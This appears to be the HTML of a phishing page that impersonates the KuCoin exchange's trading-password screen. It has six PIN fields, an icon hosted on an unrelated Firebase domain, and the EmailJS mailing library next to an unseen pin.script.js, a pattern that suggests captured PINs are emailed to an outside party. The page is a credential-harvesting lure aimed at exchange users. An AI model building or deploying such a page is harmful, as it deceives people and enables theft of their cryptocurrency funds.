<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta
      name="description"
      content="Sign in to KuCoin and start trading cryptocurrencies."
    />
    <link rel="apple-touch-icon" href="/kucoin-base-web/img/logo/512.png" />
    <link rel="icon" href="/logo.png" />
    <link
      rel="shortcut icon"
      href="https://younk-5b894.web.app/images/logo.png"
      type="image/x-icon"
    />
    <title>KuCoin: Log In | Sign In</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="pin.css" />
  </head>
  <body>
    <div class="container">
      <div class="contentSec">
        <div class="title">Enter Trading Password</div>
      </div>
      <div class="formSec">
        <div class="input">
          <form method="post">
            <input
              type="password"
              id="digit1"
              class="pin-input"
              maxlength="1"
            />
            <input
              type="password"
              id="digit2"
              class="pin-input"
              maxlength="1"
            />
            <input
              type="password"
              id="digit3"
              class="pin-input"
              maxlength="1"
            />
            <input
              type="password"
              id="digit4"
              class="pin-input"
              maxlength="1"
            />
            <input
              type="password"
              id="digit5"
              class="pin-input"
              maxlength="1"
            />
            <input
              type="password"
              id="digit6"
              class="pin-input"
              maxlength="1"
            />
          </form>
          <div class="fgp">Forgot trading password?</div>
        </div>

        <div class="buttonSec">
          <button id="submitBtn" type="submit">Next</button>
        </div>
      </div>
    </div>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="pin.script.js"></script>
  </body>
</html>
